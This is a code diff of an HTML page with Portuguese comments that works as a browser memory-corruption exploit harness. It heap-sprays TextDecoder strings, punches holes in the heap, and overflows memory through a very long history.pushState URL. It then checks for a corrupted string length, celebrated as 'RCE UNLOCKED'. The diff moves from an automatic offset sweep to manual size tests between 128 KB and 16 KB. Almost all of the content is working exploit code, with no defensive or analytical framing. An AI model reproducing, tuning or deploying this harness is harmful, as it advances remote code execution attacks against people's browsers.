@@ -1,117 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bridge Sweeper (Auto-Reverse)</title>
+    <title>Size Downgrade: Buscando Strings Inline</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
         button { 
-            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px;
+            font-size: 20px; padding: 15px; width: 100%; border: 2px solid #ff00ff; background: #220022; color: #fff; cursor: pointer; margin-bottom: 10px;
         }
         #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
-        .data { color: yellow; }
+        .win { background-color: #ff00ff; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 3px solid white; }
     </style>
 </head>
 <body>
 
-    <h1>Bridge Sweeper</h1>
-    <p>Recuando a ponte automaticamente de 8 em 8 bytes a partir de 8192.</p>
+    <h1>Size Downgrade</h1>
+    <p>Tentando achar strings "Inline" onde o Length fica junto dos Dados.</p>
 
-    <button onclick="startSweeper()">INICIAR VARREDURA AUTOMÁTICA</button>
-    <button onclick="stop()" style="border-color:red; color:red">PARAR</button>
+    <button onclick="runTest(128 * 1024)">1. Testar 128 KB</button>
+    <button onclick="runTest(64 * 1024)">2. Testar 64 KB</button>
+    <button onclick="runTest(32 * 1024)">3. Testar 32 KB</button>
+    <button onclick="runTest(16 * 1024)">4. Testar 16 KB</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const BASE_OFFSET = 709520;     
-        const ATTACK_SIZE = 1024 * 4;   
-        const TARGET_SIZE = 1024 * 1024; 
-        const PAYLOAD_SIZE = TARGET_SIZE - 24; 
+        // O Overflow precisa ser agressivo para cobrir o desalinhamento dos objetos menores
+        const BASE_OFFSET = 709520; 
+        const OVERFLOW_AMT = 1024 * 128; // 128KB de cobertura
 
-        // Começamos onde sabemos que cai nos dados
-        let currentBridge = 8192; 
-        let isRunning = false;
         var victims = [];
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let cls = type === 'win' ? 'class="win"' : (type === 'data' ? 'class="data"' : '');
+            let cls = type === 'win' ? 'class="win"' : '';
             el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        function stop() { isRunning = false; log("Parando..."); }
+        async function runTest(targetBytes) {
+            log(`--- TESTANDO TAMANHO: ${targetBytes / 1024} KB ---`);
+            
+            // Header estimado de 24 bytes para StringImpl
+            const payloadSize = targetBytes - 24;
 
-        async function startSweeper() {
-            if(isRunning) return;
-            isRunning = true;
-            log("Iniciando varredura...");
+            // 1. Limpeza
+            victims = [];
+            await forceGC();
 
-            // Vamos recuar até 256 bytes (limite de segurança)
-            while(isRunning && currentBridge > (8192 - 256)) {
+            try {
+                // 2. Spray de Strings Médias (TextDecoder)
+                let rawBuffer = new Uint8Array(payloadSize);
+                rawBuffer.fill(0x42); 
+                let decoder = new TextDecoder("utf-8");
+                let baseString = decoder.decode(rawBuffer);
+
+                // Aumentamos a quantidade porque os objetos são menores
+                // Queremos preencher o mesmo volume de RAM (~40MB)
+                const SPRAY_COUNT = Math.floor((40 * 1024 * 1024) / targetBytes);
                 
-                log(`----------------------------------------`);
-                log(`TESTANDO PONTE: ${currentBridge} bytes`);
+                log(`Alocando ${SPRAY_COUNT} strings...`);
+                
+                for(let i=0; i<SPRAY_COUNT; i++) {
+                    let s = i + "_" + baseString.substring((i+"_").length);
+                    victims.push(s);
+                }
 
-                // 1. Limpeza
-                victims = [];
+                // 3. Buracos
+                log("Abrindo buracos...");
+                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                 await forceGC();
 
-                try {
-                    // 2. SPRAY (1MB TextDecoder - O Fiel)
-                    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
-                    rawBuffer.fill(0x42); 
-                    let decoder = new TextDecoder("utf-8");
-                    let baseString = decoder.decode(rawBuffer);
+                // 4. Exploit
+                log("Disparando...");
+                setTimeout(() => {
+                    try {
+                        let buffer = "A".repeat(BASE_OFFSET);
+                        buffer += "\x01".repeat(OVERFLOW_AMT);
+                        
+                        history.pushState({}, "downgrade", "/" + buffer);
 
-                    const SPRAY_COUNT = 60;
-                    for(let i=0; i<SPRAY_COUNT; i++) {
-                        let s = i + "_" + baseString.substring((i+"_").length);
-                        victims.push(s);
+                        checkVictims(payloadSize);
+
+                    } catch (e) {
+                        log("Erro: " + e.message);
                     }
+                }, 500);
 
-                    // 3. BURACOS
-                    for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
-                    await forceGC();
-
-                    // 4. EXPLOIT
-                    let buffer = "A".repeat(BASE_OFFSET);
-                    buffer += "\x01".repeat(currentBridge); // Tamanho variável
-                    buffer += "\x01".repeat(ATTACK_SIZE);   // Ataque
-                    
-                    history.replaceState({}, "sweep_" + currentBridge, "/" + buffer);
-
-                    // 5. CHECAGEM
-                    let result = checkVictims(PAYLOAD_SIZE);
-
-                    if (result === "RCE") {
-                        isRunning = false;
-                        return; // Venceu!
-                    } 
-                    else if (result === "DATA") {
-                        log(`[${currentBridge}] Ainda em DADOS. Recuando 8 bytes...`, 'data');
-                        currentBridge -= 8; // Recua e tenta de novo
-                    } 
-                    else {
-                        // Se deu MISS (nada atingido), pode ser desalinhamento do Heap.
-                        // Tenta o mesmo tamanho de novo? Ou recua?
-                        // Vamos recuar para manter o fluxo.
-                        log(`[${currentBridge}] Nada atingido. Recuando...`);
-                        currentBridge -= 8;
-                    }
-
-                    // Pausa para estabilidade
-                    await new Promise(r => setTimeout(r, 100));
-
-                } catch(e) {
-                    log("Erro crítico (Reiniciando ciclo): " + e.message);
-                    await new Promise(r => setTimeout(r, 1000));
-                }
+            } catch(e) {
+                log("Erro Memória: " + e.message);
             }
-            log("Fim da varredura.");
         }
 
         function checkVictims(expectedLen) {
+            let success = false;
             for(let i=1; i<victims.length; i+=2) {
                 let s = victims[i];
                 if(!s) continue;
@@ -122,24 +103,29 @@
 
                     // SUCESSO (RCE)
                     if (msg.length !== expectedLen) {
-                        log(`!!! JACKPOT !!! Length Corrompido com Ponte ${currentBridge}!`, 'win');
+                        log(`!!! JACKPOT !!! Length Corrompido com ${expectedLen+24} bytes!`, 'win');
                         log(`Novo Tamanho: ${msg.length}`, 'win');
-                        alert(`RCE UNLOCKED: BRIDGE ${currentBridge}!`);
-                        return "RCE";
+                        alert("RCE UNLOCKED!");
+                        success = true;
+                        break;
                     }
-                    
-                    // SINAL (DADOS)
-                    if (msg.charCodeAt(0) !== 66) {
-                         return "DATA";
+
+                    // SUCESSO PARCIAL (Dados)
+                    if (msg.charCodeAt(0) === 1) {
+                         log(`[Dados Atingidos] String ${i} (Conteúdo sujo).`);
+                         success = true; // Sabemos que acertamos, só falta o header estar lá
+                         // Se acertamos dados mas não length em strings pequenas,
+                         // precisamos recuar o offset manualmente depois.
                     }
+
                 } catch(e) {}
             }
-            return "MISS";
+            if(!success) log("Nada atingido. Tente outro tamanho.");
         }
 
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 400));
+            return new Promise(r => setTimeout(r, 600));
         }
     </script>
 </body>
